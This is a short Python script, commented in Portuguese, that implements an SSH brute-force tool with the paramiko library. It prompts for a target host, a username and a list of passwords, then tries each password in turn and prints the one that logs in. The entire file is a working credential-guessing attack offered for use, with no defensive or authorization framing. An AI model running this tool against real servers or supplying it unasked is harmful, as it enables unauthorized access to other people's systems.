import paramiko
from typing import List


class FerramentaForcaBrutaSSH:
    def __init__(self, host: str, usuario: str, senhas: List[str]):
        """
        Inicializa a ferramenta com as informações do host, usuário e lista de senhas.
        """
        self.host = host
        self.usuario = usuario
        self.senhas = senhas

    def tentar_login(self, senha: str) -> bool:
        """
        Tenta fazer login no servidor SSH com a senha fornecida.
        """
        cliente = paramiko.SSHClient()
        cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            cliente.connect(self.host, username=self.usuario, password=senha, timeout=5)
            cliente.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception as e:
            print(f"Erro inesperado: {e}")
            return False

    def executar_forca_bruta(self):
        """
        Executa a força bruta tentando todas as senhas fornecidas.
        """
        for senha in self.senhas:
            print(f"Tentando senha: {senha}")
            if self.tentar_login(senha):
                print(f"Senha encontrada: {senha}")
                return
        print("Nenhuma senha foi encontrada.")


def main():
    host = input('Digite o endereço do servidor SSH: ')
    usuario = input('Digite o nome de usuário: ')
    senhas = input('Digite a lista de senhas separadas por vírgula: ').split(',')

    ferramenta = FerramentaForcaBrutaSSH(host, usuario, [senha.strip() for senha in senhas])
    ferramenta.executar_forca_bruta()


if __name__ == '__main__':
    main()
